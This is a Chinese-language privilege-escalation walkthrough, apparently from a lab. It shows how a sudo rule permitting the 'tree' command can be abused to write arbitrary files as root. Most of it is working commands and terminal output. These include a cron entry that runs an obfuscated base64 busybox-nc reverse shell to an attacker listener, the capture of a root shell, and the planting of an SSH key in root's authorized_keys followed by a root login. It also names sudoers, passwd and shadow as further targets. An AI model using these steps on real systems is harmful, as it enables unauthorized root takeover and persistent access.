tree会以树状列出文件目录，其中--fromfile选项可供读取文件，结合多个选项可以进行sudo配置写入，定时任务，公钥写入等提权方式，介于无害，选择定时任务或者公钥写入无疑最好



```
admin@debian:/tmp/test$ sudo -l
Matching Defaults entries for admin on debian:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User admin may run the following commands on debian:
    (ALL) /usr/bin/tree
admin@debian:/tmp/test$ ls
test
admin@debian:/tmp/test$ cat test 
111
admin@debian:/tmp/test$
```

# 读取文件内容

```
admin@debian:/tmp/test$ tree --fromfile test 
test
`-- 111

0 directories, 1 file
```

# 写入定时任务

先看原理
```
admin@debian:/tmp/test$ tree --fromfile test 
test
`-- 111

0 directories, 1 file
admin@debian:/tmp/test$ tree --fromfile test -i
test
111

0 directories, 1 file
admin@debian:/tmp/test$ tree --fromfile test -i --noreport 
test
111
admin@debian:/tmp/test$
```
从普通的读取到最后优化结果需要用到-i --noreport选项，但是此时文件名仍然会被输出，不过可以将文件命名位#+文件名来使他成为注释

```
admin@debian:/tmp/test$ tree --fromfile test -i --noreport -o out1
admin@debian:/tmp/test$ cat out1 
test
111
admin@debian:/tmp/test$ mv test ./#test
admin@debian:/tmp/test$ ls -al
total 16
-rw-r--r--  1 admin admin    4 Nov 22 07:34 '#test'
drwxr-xr-x  2 admin admin 4096 Nov 22 07:39  .
drwxrwxrwt 11 root  root  4096 Nov 22 07:32  ..
-rw-r--r--  1 admin admin    9 Nov 22 07:39  out1
admin@debian:/tmp/test$ tree --fromfile '#test' -i --noreport -o out2
admin@debian:/tmp/test$ cat out1 && cat out2 
test
111
#test
111
admin@debian:/tmp/test$ 

```
可以看到处理后原来的文件名，变成注释了

```
admin@debian:/tmp/test$ cat \#rootbash 
* * * * * root bash -c 'echo YnVzeWJveCBuYyAxOTIuMTY4LjIuNjAgMjMzMiAtZSAvYmluL2Jhc2gK | base64 -d | bash'

admin@debian:/tmp/test$ sudo tree --fromfile -i --noreport '#rootbash' 
#rootbash
*\ *\ *\ *\ *\ root\ bash\ -c\ 'echo\ YnVzeWJveCBuYyAxOTIuMTY4LjIuNjAgMjMzMiAtZSAvYmluL2Jhc2gK\ |\ base64\ -d\ |\ bash'

admin@debian:/tmp/test$ sudo tree --fromfile -i --noreport '#rootbash' -N
#rootbash
* * * * * root bash -c 'echo YnVzeWJveCBuYyAxOTIuMTY4LjIuNjAgMjMzMiAtZSAvYmluL2Jhc2gK | base64 -d | bash'

admin@debian:/tmp/test$ sudo tree --fromfile -i --noreport '#rootbash' -N -o /etc/cron.d/rootbashadmin@debian:/tmp/test$ cat /etc/cron.d/rootbash 
#rootbash
* * * * * root bash -c 'echo YnVzeWJveCBuYyAxOTIuMTY4LjIuNjAgMjMzMiAtZSAvYmluL2Jhc2gK | base64 -d | bash'

admin@debian:/tmp/test$ 

```
使用-N避免转义

等待一分钟拿到shell
```
┌──(root㉿kali)-[~]
└─# nc -lvvp 2332
listening on [any] 2332 ...
192.168.2.60: inverse host lookup failed: Unknown host
connect to [192.168.2.60] from (UNKNOWN) [192.168.2.60] 47068
id
uid=0(root) gid=0(root) groups=0(root)

```

# 写入公钥

先看注意项

```
admin@debian:/tmp/test$ cat '#test' 
//////111///
admin@debian:/tmp/test$ tree '#test' --fromfile --noreport -i
#test
111
admin@debian:/tmp/test$ tree '#test' --fromfile --noreport -i -o out3
admin@debian:/tmp/test$ cat out3
#test
111
admin@debian:/tmp/test$ 


```
tree没法输出/，写到文件也是无/，所以写入公钥要尽量避免出现/

```
admin@debian:/tmp/test$ cat \#test 
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDetuUziNzcjd0XxXUcOTOsCEIkzWukaFKx8+hZQe4TL ssh-ed25519-20251122211123
admin@debian:/tmp/test$ sudo tree -i --fromfile --noreport '#test' -N
#test
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDetuUziNzcjd0XxXUcOTOsCEIkzWukaFKx8+hZQe4TL ssh-ed25519-20251122211123

admin@debian:/tmp/test$ sudo tree -i --fromfile --noreport '#test' -N -o /root/.ssh/authorized_keys
admin@debian:/tmp/test$ 

```

```
┌──(root㉿kali)-[/tmp/test]
└─# chmod 600 id_ed25519        
                                                                                          
┌──(root㉿kali)-[/tmp/test]
└─# ssh -i id_ed25519 root@192.168.2.84 -p 222
Linux debian 4.19.0-25-amd64 #1 SMP Debian 4.19.289-2 (2023-08-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Nov 19 07:53:04 2025 from 192.168.31.91
-bash: warning: setlocale: LC_ALL: cannot change locale (zh_CN.UTF-8)
======================================
  欢迎使用 Linux 服务器
  登录时间：2025-11-22 08:15:22
  内网IP：192.168.2.84
  外网IP：1.198.22.190
======================================
root@debian:~# 
```
可以看到成功连上
同样写入sudo配置，passwd，甚至shadow也是同样道理，不过犹豫风险过大，建议采用以上两种方法